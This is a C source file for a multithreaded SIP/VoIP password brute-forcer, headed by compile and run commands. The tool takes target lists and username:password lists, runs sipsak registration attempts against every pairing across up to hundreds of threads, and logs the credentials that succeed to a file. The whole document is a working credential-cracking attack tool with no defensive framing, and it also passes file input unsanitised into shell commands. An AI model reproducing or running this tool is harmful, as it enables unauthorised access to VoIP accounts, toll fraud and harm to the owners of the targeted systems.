gcc crack.c -o crack -pthread
./crack --protocol 1 --threads 500 --targets 500 --targets-file ip.txt --user-pass-file User_Pass --success-file success.txt --reservation-file reservations.txt

=====================================


#include <stdio.h>
#include <stdlib.h>
#include <getopt.h>
#include <string.h>
#include <pthread.h>
#include <unistd.h>

// Define constants for protocol types
#define PROTOCOL_TCP 0
#define PROTOCOL_UDP 1
#define PROTOCOL_TLS 2

// Define constant for max size of a line in input files
#define MAX_LINE_SIZE 1024

// Define structures to store target and user/pass information
typedef struct {
    char ip[100]; // to store IP or domain
    int port;
} Target;

typedef struct {
    char username[100];
    char password[100];
} UserPass;

// Global variables to hold user options
int protocol = PROTOCOL_TCP;
int num_threads = 10;
int num_targets = 5000;
char targets_file[MAX_LINE_SIZE] = "ip.txt";
char user_pass_file[MAX_LINE_SIZE] = "User_Pass";
char success_file[MAX_LINE_SIZE] = "Success_results.txt";
char reservation_file[MAX_LINE_SIZE] = "reservations_targets.txt";
Target* targets;
int num_user_pass;
UserPass* user_passes;

// Function prototypes
Target* read_targets(const char* filename, int* num_targets);
UserPass* read_user_pass(const char* filename, int* num_user_pass);
void print_usage();
void sip_crack(Target* target, UserPass* user_pass);
void* thread_function(void* arg);

// Function to read targets from file
Target* read_targets(const char* filename, int* num_targets) {
    FILE* file = fopen(filename, "r");
    if (!file) {
        perror("Failed to open targets file");
        exit(EXIT_FAILURE);
    }

    Target* targets = malloc(sizeof(Target) * 10000);
    *num_targets = 0;
    char line[MAX_LINE_SIZE];
    while (*num_targets < 10000 && fgets(line, sizeof(line), file)) {
        sscanf(line, "%[^:]:%d", targets[*num_targets].ip, &targets[*num_targets].port);
        (*num_targets)++;
    }
    fclose(file);
    return targets;
}

// Function to read usernames and passwords from file
UserPass* read_user_pass(const char* filename, int* num_user_pass) {
    FILE* file = fopen(filename, "r");
    if (!file) {
        perror("Failed to open username and password file");
        exit(EXIT_FAILURE);
    }

    UserPass* user_passes = malloc(sizeof(UserPass) * 10000);
    *num_user_pass = 0;
    char line[MAX_LINE_SIZE];
    while (*num_user_pass < 10000 && fgets(line, sizeof(line), file)) {
        sscanf(line, "%[^:]:%s", user_passes[*num_user_pass].username, user_passes[*num_user_pass].password);
        (*num_user_pass)++;
    }
    fclose(file);
    return user_passes;
}

// Function to print usage information
void print_usage() {
    printf("Usage: ./crack [options]\n"
           "Options:\n"
           "    -p, --protocol <PROTOCOL_TCP, PROTOCOL_UDP, PROTOCOL_TLS>\n"
           "    -t, --threads <number of threads>\n"
           "    -T, --targets <number of targets>\n"
           "    -f, --targets-file <file with targets>\n"
           "    -u, --user-pass-file <file with usernames and passwords>\n"
           "    -s, --success-file <file to write successful attempts>\n"
           "    -r, --reservation-file <file to write reservations>\n"
           "    -h, --help\n");
}

// Function to perform cracking for a specific target and user/pass combination
void sip_crack(Target* target, UserPass* user_pass) {
    char command[MAX_LINE_SIZE];
    char protocol_str[MAX_LINE_SIZE];

    if (protocol == PROTOCOL_TCP) {
        strncpy(protocol_str, "tcp", MAX_LINE_SIZE - 1);
    } else if (protocol == PROTOCOL_UDP) {
        strncpy(protocol_str, "udp", MAX_LINE_SIZE - 1);
    } else if (protocol == PROTOCOL_TLS) {
        strncpy(protocol_str, "tls --tls-ignore-cert-failure", MAX_LINE_SIZE - 1);
    } else {
        fprintf(stderr, "Invalid protocol specified.\n");
        return;
    }

    snprintf(command, MAX_LINE_SIZE, "sipsak -U -C sip:%s@%s -s sip:%s@%s:%d -u %s -a %s -H %s -i -vvv -E %s 2>&1",
             user_pass->username, target->ip,
             user_pass->username, target->ip, target->port,
             user_pass->username, user_pass->password,
             target->ip, protocol_str);

    printf("Running command: %s\n", command);

    // Open the command as a pipe and read the output
    FILE* pipe = popen(command, "r");
    if (!pipe) {
        perror("Failed to open pipe");
        return;
    }

    // Read each line of the output
    char buffer[MAX_LINE_SIZE];
    while (fgets(buffer, sizeof(buffer), pipe) != NULL) {
        // Check if the response contains "200 OK", "202 Accepted", or "204 No Notification"
        if (strstr(buffer, "200 OK") || strstr(buffer, "202 Accepted") || strstr(buffer, "204 No Notification")) {
            printf("Success: %s\n", buffer);
            // Write the successful attempt to the success file
            FILE* success = fopen(success_file, "a");
            if (success) {
                fprintf(success, "Target: %s:%d, Username: %s, Password: %s\n", target->ip, target->port, user_pass->username, user_pass->password);
                fclose(success);
            } else {
                perror("Failed to write success results");
            }
            break; // Break the loop if successful response is found
        }
    }

    pclose(pipe);
}

// Thread function for cracking
void* thread_function(void* arg) {
    int thread_id = *(int*)arg;
    int targets_per_thread = num_targets / num_threads;
    int start = thread_id * targets_per_thread;
    int end = (thread_id == num_threads - 1) ? num_targets : (thread_id + 1) * targets_per_thread;

    for (int i = start; i < end; i++) {
        for (int j = 0; j < num_user_pass; j++) {
            sip_crack(&targets[i], &user_passes[j]);
        }
    }

    return NULL;
}

// Entry point of the program
int main(int argc, char* argv[]) {
    // Variables to hold user options

    // Struct for getopt
    static struct option long_options[] = {
        {"protocol", required_argument, NULL, 'p'},
        {"threads", required_argument, NULL, 't'},
        {"targets", required_argument, NULL, 'T'},
        {"targets-file", required_argument, NULL, 'f'},
        {"user-pass-file", required_argument, NULL, 'u'},
        {"success-file", required_argument, NULL, 's'},
        {"reservation-file", required_argument, NULL, 'r'},
        {"help", no_argument, NULL, 'h'},
        {NULL, 0, NULL, 0}};

    // Parse options
    int opt;
    while ((opt = getopt_long(argc, argv, "p:t:T:f:u:s:r:h", long_options, NULL)) != -1) {
        switch (opt) {
            case 'p':
                protocol = atoi(optarg);
                break;
            case 't':
                num_threads = atoi(optarg);
                break;
            case 'T':
                num_targets = atoi(optarg);
                break;
            case 'f':
                strncpy(targets_file, optarg, MAX_LINE_SIZE - 1);
                break;
            case 'u':
                strncpy(user_pass_file, optarg, MAX_LINE_SIZE - 1);
                break;
            case 's':
                strncpy(success_file, optarg, MAX_LINE_SIZE - 1);
                break;
            case 'r':
                strncpy(reservation_file, optarg, MAX_LINE_SIZE - 1);
                break;
            case 'h':
            default:
                print_usage();
                return EXIT_SUCCESS;
        }
    }

    // Load targets and user/pass data from files
    targets = read_targets(targets_file, &num_targets);
    user_passes = read_user_pass(user_pass_file, &num_user_pass);

    // Create threads and perform cracking in parallel
    pthread_t threads[num_threads];
    int thread_ids[num_threads];
    for (int i = 0; i < num_threads; i++) {
        thread_ids[i] = i;
        if (pthread_create(&threads[i], NULL, thread_function, &thread_ids[i]) != 0) {
            perror("Failed to create thread");
            exit(EXIT_FAILURE);
        }
    }

    // Wait for threads to finish
    for (int i = 0; i < num_threads; i++) {
        if (pthread_join(threads[i], NULL) != 0) {
            perror("Failed to join thread");
            exit(EXIT_FAILURE);
        }
    }

    // Cleanup
    free(targets);
    free(user_passes);

    return EXIT_SUCCESS;
}
